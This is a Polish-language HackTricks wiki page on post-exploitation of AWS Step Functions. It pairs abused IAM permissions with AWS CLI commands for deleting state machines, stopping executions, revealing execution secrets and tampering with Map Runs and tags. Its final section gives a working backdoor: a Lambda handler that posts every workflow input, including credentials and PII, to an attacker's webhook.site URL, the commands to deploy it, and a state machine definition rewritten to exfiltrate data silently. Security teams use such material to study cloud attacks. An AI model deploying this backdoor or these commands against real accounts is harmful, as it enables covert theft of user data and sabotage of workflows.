# AWS - Post Eksploatacja Funkcji Kroków

{{#include ../../../banners/hacktricks-training.md}}

## Funkcje Kroków

Aby uzyskać więcej informacji na temat tej usługi AWS, sprawdź:

{{#ref}}
../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### `states:RevealSecrets`

To uprawnienie pozwala na **ujawnienie tajnych danych wewnątrz wykonania**. W tym celu należy ustawić poziom inspekcji na TRACE oraz parametr revealSecrets na true.

<figure><img src="../../../images/image (348).png" alt=""><figcaption></figcaption></figure>

### `states:DeleteStateMachine`, `states:DeleteStateMachineVersion`, `states:DeleteStateMachineAlias`

Atakujący z tymi uprawnieniami mógłby na stałe usunąć maszyny stanów, ich wersje i aliasy. Może to zakłócić krytyczne przepływy pracy, prowadzić do utraty danych i wymagać znacznego czasu na odzyskanie i przywrócenie dotkniętych maszyn stanów. Dodatkowo, pozwoliłoby to atakującemu na zatarcie śladów, zakłócenie dochodzeń kryminalistycznych i potencjalne sparaliżowanie operacji poprzez usunięcie niezbędnych procesów automatyzacji i konfiguracji stanów.

> [!NOTE]
>
> - Usuwając maszynę stanów, usuwasz również wszystkie jej powiązane wersje i aliasy.
> - Usuwając alias maszyny stanów, nie usuwasz wersji maszyny stanów odnoszących się do tego aliasu.
> - Nie można usunąć wersji maszyny stanów, która jest obecnie odniesiona przez jeden lub więcej aliasów.
```bash
# Delete state machine
aws stepfunctions delete-state-machine --state-machine-arn <value>
# Delete state machine version
aws stepfunctions delete-state-machine-version --state-machine-version-arn <value>
# Delete state machine alias
aws stepfunctions delete-state-machine-alias --state-machine-alias-arn <value>
```
- **Potencjalny wpływ**: Zakłócenie krytycznych procesów, utrata danych i przestoje operacyjne.

### `states:UpdateMapRun`

Napastnik z tym uprawnieniem mógłby manipulować konfiguracją awarii Map Run oraz ustawieniem równoległym, mając możliwość zwiększenia lub zmniejszenia maksymalnej liczby dozwolonych wykonania procesów podrzędnych, co bezpośrednio wpływa na wydajność usługi. Dodatkowo, napastnik mógłby manipulować tolerowanym procentem i liczbą awarii, mając możliwość zmniejszenia tej wartości do 0, co spowodowałoby, że za każdym razem, gdy element zawiedzie, całe uruchomienie mapy zawiedzie, co bezpośrednio wpłynęłoby na wykonanie maszyny stanów i potencjalnie zakłóciłoby krytyczne procesy.
```bash
aws stepfunctions update-map-run --map-run-arn <value> [--max-concurrency <value>] [--tolerated-failure-percentage <value>] [--tolerated-failure-count <value>]
```
- **Potencjalny wpływ**: Degradacja wydajności i zakłócenie krytycznych przepływów pracy.

### `states:StopExecution`

Napastnik z tym uprawnieniem mógłby być w stanie zatrzymać wykonanie dowolnej maszyny stanowej, zakłócając trwające przepływy pracy i procesy. Może to prowadzić do niekompletnych transakcji, wstrzymania operacji biznesowych i potencjalnej korupcji danych.

> [!WARNING]
> Ta akcja nie jest wspierana przez **maszyny stanowe express**.
```bash
aws stepfunctions stop-execution --execution-arn <value> [--error <value>] [--cause <value>]
```
- **Potencjalny wpływ**: Zakłócenie bieżących przepływów pracy, przestoje operacyjne i potencjalna korupcja danych.

### `states:TagResource`, `states:UntagResource`

Napastnik mógłby dodać, zmodyfikować lub usunąć tagi z zasobów Step Functions, zakłócając alokację kosztów w Twojej organizacji, śledzenie zasobów oraz polityki kontroli dostępu oparte na tagach.
```bash
aws stepfunctions tag-resource --resource-arn <value> --tags Key=<key>,Value=<value>
aws stepfunctions untag-resource --resource-arn <value> --tag-keys <key>
```
**Potencjalny wpływ**: Zakłócenie alokacji kosztów, śledzenia zasobów i polityk kontroli dostępu opartych na tagach.

---

### `states:UpdateStateMachine`, `lambda:UpdateFunctionCode`

Atakujący, który przejmuje kontrolę nad użytkownikiem lub rolą z następującymi uprawnieniami:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "AllowUpdateStateMachine",
"Effect": "Allow",
"Action": "states:UpdateStateMachine",
"Resource": "*"
},
{
"Sid": "AllowUpdateFunctionCode",
"Effect": "Allow",
"Action": "lambda:UpdateFunctionCode",
"Resource": "*"
}
]
}
```
...można przeprowadzić **wysokowydajny i dyskretny atak poeksploatacyjny**, łącząc backdooring Lambda z manipulacją logiką Step Function.

Ten scenariusz zakłada, że ofiara używa **AWS Step Functions do orkiestracji przepływów pracy, które przetwarzają wrażliwe dane wejściowe**, takie jak dane uwierzytelniające, tokeny lub PII.

Przykład wywołania ofiary:
```bash
aws stepfunctions start-execution \
--state-machine-arn arn:aws:states:us-east-1:<victim-account-id>:stateMachine:LegitStateMachine \
--input '{"email": "victim@example.com", "password": "hunter2"}' --profile victim
```
Jeśli Funkcja Krokowa jest skonfigurowana do wywoływania Lambdy, takiej jak `LegitBusinessLogic`, atakujący może przejść do **dwóch ukrytych wariantów ataku**:

---

####  Zaktualizowana funkcja lambda

Atakujący modyfikuje kod funkcji Lambda już używanej przez Funkcję Krokową (`LegitBusinessLogic`), aby cicho wyeksportować dane wejściowe.
```python
# send_to_attacker.py
import requests

def lambda_handler(event, context):
requests.post("https://webhook.site/<attacker-id>/exfil", json=event)
return {"status": "exfiltrated"}
```

```bash
zip function.zip send_to_attacker.py

aws lambda update-function-code \
--function-name LegitBusinessLogic \
--zip-file fileb://function.zip -profile attacker
```
---

#### Dodaj złośliwy stan do funkcji krokowej

Alternatywnie, atakujący może wstrzyknąć **stan eksfiltracji** na początku przepływu pracy, aktualizując definicję funkcji krokowej.
```malicious_state_definition.json
{
"Comment": "Backdoored for Exfiltration",
"StartAt": "OriginalState",
"States": {
"OriginalState": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:<victim-id>:function:LegitBusinessLogic",
"End": true
}
}
}

```

```bash
aws stepfunctions update-state-machine \
--state-machine-arn arn:aws:states:us-east-1:<victim-id>:stateMachine:LegitStateMachine \
--definition file://malicious_state_definition.json --profile attacker
```
Napastnik może jeszcze bardziej dyskretnie zaktualizować definicję stanu na coś takiego jak to
{
"Comment": "Backdoored for Exfiltration",
"StartAt": "ExfiltrateSecrets",
"States": {
"ExfiltrateSecrets": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:victim-id:function:SendToAttacker",
"InputPath": "$",
"ResultPath": "$.exfil",
"Next": "OriginalState"
},
"OriginalState": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:victim-id:function:LegitBusinessLogic",
"End": true
}
}
}
gdzie ofiara nie zauważy różnicy

---

### Ustawienia ofiary (Kontekst dla Eksploatacji)

- Funkcja krokowa (`LegitStateMachine`) jest używana do przetwarzania wrażliwych danych użytkownika.
- Wywołuje jedną lub więcej funkcji Lambda, takich jak `LegitBusinessLogic`.

---

**Potencjalny wpływ**:
- Cicha eksfiltracja wrażliwych danych, w tym sekretów, poświadczeń, kluczy API i PII.
- Brak widocznych błędów lub awarii w wykonaniu przepływu pracy.
- Trudne do wykrycia bez audytu kodu Lambda lub śladów wykonania.
- Umożliwia długoterminową persistencję, jeśli tylna furtka pozostaje w kodzie lub logice ASL.


{{#include ../../../banners/hacktricks-training.md}}
